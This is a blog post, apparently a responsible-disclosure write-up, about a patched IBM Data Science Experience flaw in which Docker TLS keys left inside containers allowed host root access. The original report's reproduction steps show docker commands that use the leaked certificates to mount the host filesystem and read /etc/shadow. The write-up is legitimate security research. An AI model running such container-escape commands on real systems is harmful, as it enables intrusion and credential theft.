@@ -1,0 +1,296 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="x-ua-compatible" content="ie=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>wyc - IBM Data Science Experience: Whole-Cluster Privilege Escalation Disclosure</title>
+		<link rel="stylesheet" href="../css/default.css" />
+	</head>
+	<body>
+    <header>
+      <h1>wyc's domain</h1>
+      <ul>
+        <li><a href="https://github.com/wyc" target="_blank">
+            <img src="../images/github.png" alt="GitHub">
+        </a></li>
+        <li><a href="https://www.linkedin.com/in/changwayne" target="_blank">
+            <img src="../images/linkedin.png" alt="LinkedIn">
+        </a></li>
+        <li><a href="https://twitter.com/wycdd" target="_blank">
+            <img src="../images/twitter.png" alt="Twitter">
+        </a></li>
+      </ul>
+    </header>
+    <nav>
+      <a href="../">Home</a> |
+      <a href="../blog.html">Blog</a> |
+      <a href="../projects.html">Projects</a> |
+      <a href="../consulting.html">Consulting</a>
+    </nav>
+		<hr />
+    <content>
+      <h2>IBM Data Science Experience: Whole-Cluster Privilege Escalation Disclosure</h2>
+      <div class="info">
+    Posted on February 21, 2017
+    
+</div>
+
+<div class="info">
+    
+    Tags: <a href="../tags/security.html">security</a>
+    
+</div>
+
+<p>For the impatient, <a href="#original-report">click here</a> for the original report.</p>
+<p>This is a disclosure of a privilege escalation vulnerability I found in the IBM Data Science Experience product, which was patched on Feb 15th, 2017. It was a misconfiguration vulnerability with very severe consequences. In short, they left all the <a href="https://docs.docker.com/engine/security/https/">Docker TLS keys</a> in the container, which is the same as leaving a jail cell’s keys inside the jail cell. I worked with <a href="https://www-03.ibm.com/security/secure-engineering/process.html">IBM PSIRT</a> staff to address this. Thank you to Marcia at <a href="https://www.zeitgeist.law/">Zeitgeist Law</a> for helping me think through disclosure issues.</p>
+<p><a href="http://datascience.ibm.com/">IBM Data Science Experience</a> is an all-in-one data analytics product built on top of <a href="https://www-03.ibm.com/press/us/en/pressrelease/49866.wss">IBM’s $300MM investment</a> into Apache Spark. It touts a seamlessly integrated package of big data analytics tools including Spark, Jupyter notebooks, RStudio, Shiny, and more.</p>
+<p>What was at stake:</p>
+<ul>
+<li>Root access across whole compute cluster</li>
+<li>R/W to 100s of TBs of customer data</li>
+</ul>
+<p>Conditions required:</p>
+<ul>
+<li>Web browser</li>
+<li>Free trial account</li>
+</ul>
+<h4 id="timeline">Timeline</h4>
+<ul>
+<li><p>January 31st: I went to an event titled “IBM Open Source Analytics &amp; Data Science Experience” where we were told to get accounts and test out the product. I noticed that the Docker containers could run arbitrary code. This was a red flag. When I got home, I poked around and found this bug in half an hour or so.</p></li>
+<li><p>February 1st: I emailed the PSIRT team my encrypted write-up.</p></li>
+<li><p>February 2nd: Heard back from PSIRT: my issue was assigned an internal advisory ID.</p></li>
+<li><p>February 8th: After some radio silence, I sent them an email about my disclosure plans.</p></li>
+<li><p>February 9th: PSIRT said that my findings were verified and a fix was in the works by March 31st.</p></li>
+<li><p>February 15th: PSIRT said that this issue was patched early. I got added to the new <a href="https://www.ibm.com/blogs/psirt/ibm-acknowledgement/">acknowledgement website</a>.</p></li>
+</ul>
+<h4 id="synopsis">Synopsis</h4>
+<p>I think that container security will be a big issue for the next 0-3 years. Can containers be used securely and in HIPAA/PCI/HITRUST/etc.-compliant environments? Sure! Just as much as a lot of other software can. But there’s <a href="https://www.nccgroup.trust/us/our-research/understanding-and-hardening-linux-containers/">a lot to do to make that happen</a>, and every security control that you need to apply has a compounding <code>p &gt; 0</code> of being applied incorrectly. <a href="https://en.wikipedia.org/wiki/Secure_by_default">Secure defaults</a> can help a lot here, and I think we’re getting there.</p>
+<p>As per this vulnerability, it’s simple enough that reading the Docker tutorials would have been sufficient to find/exploit it. Kudos to the IBM security team for taking this seriously and remediating in two weeks instead of the industry norm of <a href="https://www.sans.org/reading-room/whitepapers/application/win-friends-remediate-vulnerabilities-34530">6 months</a>. Here are just some of the (illegal) things that would have been possible through this exploit:</p>
+<ul>
+<li>Snoop on customers’ live internal datasets and engage in insider trading or corporate espionage</li>
+<li>Implement phishing attacks that ask for sensitive data inside the trusted webapp</li>
+<li>Leverage LAN access to break into other internal services</li>
+<li>Bring down entire product for who knows how long</li>
+</ul>
+<p>This kind of oversight simply isn’t acceptable for such a high-profile and enterprise product; it tells me that their security review process should be more rigorous. There are people far scarier and more capable than me, and if I could find this in half an hour of educated stumbling, what can those people find if they’re truly determined? I would like to see some real improvements made by this company moving forward, including:</p>
+<ul>
+<li>Customers should have received a security bulletin for this. I was told that a security bulletin would not be posted for this incident or cloud security incidents in general, but if I were a paying customer, I would absolutely want to hear it from the company itself and not some stupid tech blog.</li>
+<li>Improved transparency in security controls, where data are stored, how data are processed, potential risks to customers, and security best practices for this product. I think <a href="https://www.tarsnap.com/index.html">tarsnap</a> is great at this, but it may not be a fair comparison given the different use cases.</li>
+<li>A bug bounty: (admittedly, this is partially in self-interest, but) how much is preventing unauthorized access to all of your customers’ data worth? Wouldn’t a company prefer to shell out a few grand than risk a PR disaster that could cost millions of dollars in lost customers?</li>
+</ul>
+<h4 id="shameless-plug">Shameless plug</h4>
+<p>I think breaking things is fun, but I usually prefer building things. Feel free to reach out if you want to <a href="../consulting.html">work together</a>.</p>
+<h4 id="my-original-report"><a name="original-report"></a>My original report</h4>
+<p>(some personal information redacted)</p>
+<pre><code>##############################################################################
+Vulnerability Report
+
+    Title: Privilege Escalation due to Misconfigured Docker Swarm Services
+    Product: IBM Data Science Experience (http://datascience.ibm.com/)
+
+##############################################################################
+
+Summary
+-------
+The container's access to the Docker Swarm host API was secured via TLS,
+however, the keys to access said API were readily available *in the
+container*. As is commonly known, access to the Docker host API may be
+trivially leveraged into root access on the host machine.
+
+
+Affected Products
+-----------------
+- IBM Data Science Experience (http://datascience.ibm.com/)
+- Any other accessible services from its machines
+
+
+Privileges Required
+-------------------
+- Public Internet access
+- Web browser
+
+
+Concerns
+--------
+- Root access to container's host machine and (likely) root access to all
+  machines on the entire Spark compute cluster network
+- R/W access to any connected stores of customer data including network
+  drives, LAN-only services, firewall-protected endpoints, etc.
+- Installation of rootkits and/or malicious code to steal sensitive business
+  data over time
+
+
+Reproduction
+------------
+(1) Enter RStudio Web Environment, and focus the cursor on the command line.
+(2) Download and Extract Docker:
+
+    &gt; system(&quot;wget https://test.docker.com/builds/Linux/x86_64/docker-1.13.1-rc1.tgz&quot;)
+    &gt; system(&quot;tar -xvzf docker*.tgz&quot;)
+
+(3) Use docker binary with existing certificates to obtain root-like access to
+    the host using volume mounts. You may need to check/correct the naming of the
+    pem files for this to work--I'm not sure that I remembered them correctly:
+
+    &gt; system(&quot;DOCKER_API_VERSION=1.22 ./docker/docker -H 172.17.0.1 \
+              --tlscacert /certs/ca.pem --tlscert /certs/cert.pem \
+              --tlskey /certs/key.pem \
+              run -v /:/host debian cat /host/etc/shadow&quot;)
+
+    This is as good as root access.
+
+
+Further Untested Implications
+-----------------------------
+- If all the other Docker Swarm sockets share the same cryptographic handshake
+  and are accessible from the internal network, then root access to this one
+  box could be leveraged to root the whole network.
+- Users could keep on registering new accounts until they are distributed to
+  all or nearly all Spark machines on the network, performing the same root
+  privilege escalation.
+- If customer data is accessible by all nodes, then through exploitation of
+  this vulnerability on a single box, it may be feasible to siphon all
+  customer data.
+- Any other privilege escalations available after obtaining root on a machine
+
+
+Recommended Remediations
+------------------------
+These steps may help, but as always, please ensure that they are filtered
+through your knowledge of the system archicture to determine if they would be
+truly effective:
+
+Fixes and Improvements:
+
+- Remove security certificates found in `/certs/` on Docker containers and
+  refactor application architecture as necessary
+- More comprehensive sandboxing for environments where remote code execution
+  is expected. While containers have some secure defaults, they are not meant
+  for security-centric applications, and container security is something that
+  must be aggressive pursued. KVM has a much better security record.
+- Ensure separation of customer data within data stores
+- Consider solutions like AppArmor and SELinux which offer finer-grained
+  controls of access
+- Lock down `docker pull` on host
+- Use a password-protected and TLS-enabled Docker registry if not already
+
+Clean-up:
+
+- Re-image ALL affected machines. Someone may have found this exploit before I
+  did and there may already be installed rootkits or malicious software
+  services by attackers
+- Assessment of all affected customer data and responsible reporting to the
+  affected parties
+
+
+Email with the Context of this Discovery
+----------------------------------------
+
+From: Wayne Chang &lt;wayne@wycd.net&gt;
+To: &lt;REDACTED&gt;@us.ibm.com
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Type: multipart/alternative; boundary=&quot;_----------=_14859852333597655&quot;
+Date: Wed, 01 Feb 2017 16:40:33 -0500
+Subject: Security Vulnerability
+
+This is a multi-part message in MIME format.
+
+--_----------=_14859852333597655
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset=&quot;utf-8&quot;
+
+Hi &lt;REDACTED&gt;,
+
+
+
+It was a pleasure speaking with you today. Thank you for living up to
+IBM's steadfast dedication to security.
+
+
+I think I may have found a security exploit in an IBM product. I was
+at an event called &quot;IBM Open Source Analytics &amp; Data Science
+Experience&quot; last night in Atlanta, GA, yesterday on 1/31. We were told
+to sign up with free accounts and assured that the technology is
+secure and reliable.
+
+
+I conduct routine security and reliability assessments of potential new
+software on behalf of my clients, who have very sensitive data security
+concerns. My assessments consist of quick checks for common security
+mistakes such as incorrectly configured programs and poor separation of
+customer data. To my dismay, one of the checks I performed resulted in
+the revelation of a privilege escalation[1] vulnerability having serious
+potential for an attacker to impact the stability of the product and
+safety of customer data. After this discovery, I immediately disengaged
+from the affected product and did not pursue the matter any further, and
+will not resume access until this issue is addressed.
+
+
+I believe in secure software, and I absolutely make every effort to work
+with vendors such as yourself to address these issues quietly, safely,
+and professionally. With respect to responsible disclosure[2], I'm
+looking to you for the best way to proceed next. One of the IBM
+representatives mentioned that there may be something like a bug
+bounty[3]; if such a thing exists, then I'd be interested.
+
+
+The website suggests that I should use the following form:
+https://www-03.ibm.com/security/secure-engineering/report.html
+The same IBM representative from the event recently said over email to
+do the same.
+
+
+Is this the best way, or are you able to get me in touch with someone to
+more expediently resolve this potential security issue?
+
+
+Best,
+
+Wayne Chang
+
+Independent Technology Consultant
+
+WYC Technology, LLC
+
+https://wycd.net
+
+
+Links:
+
+  1. https://en.wikipedia.org/wiki/Privilege_escalation
+  2. https://en.wikipedia.org/wiki/Responsible_disclosure
+  3. https://en.wikipedia.org/wiki/Bug_bounty_program</code></pre>
+
+<br />
+<center><pre>--------</pre></center>
+
+<form class="subscribe" action="https://tinyletter.com/wc" method="post">
+  <h5>
+    If you want periodic updates on my content, I can send you them via
+    <a target="_blank" href="https://tinyletter.com/wc">TinyLetter</a>
+    every few months.
+  </h5>
+  <br />
+  <input type="text" placeholder="Enter Your Email" name="email" id="tlemail" />
+  <input type="hidden" value="1" name="embed" />
+  <input type="submit" value="Okay" />
+</form>
+
+    </content>
+    <hr />
+		<footer>
+      <small>
+      Site powered by
+      <a href="http://jaspervdj.be/hakyll" target="_blank">Hakyll</a>.
+
+      What I'm up to 
+      <a href="../now.html">now</a>.
+      <!--
+      and
+      <a href="https://www.nginx.com" target="_blank">nginx</a>.
+      --></small>
+		</footer>
+  </body>
+</html>
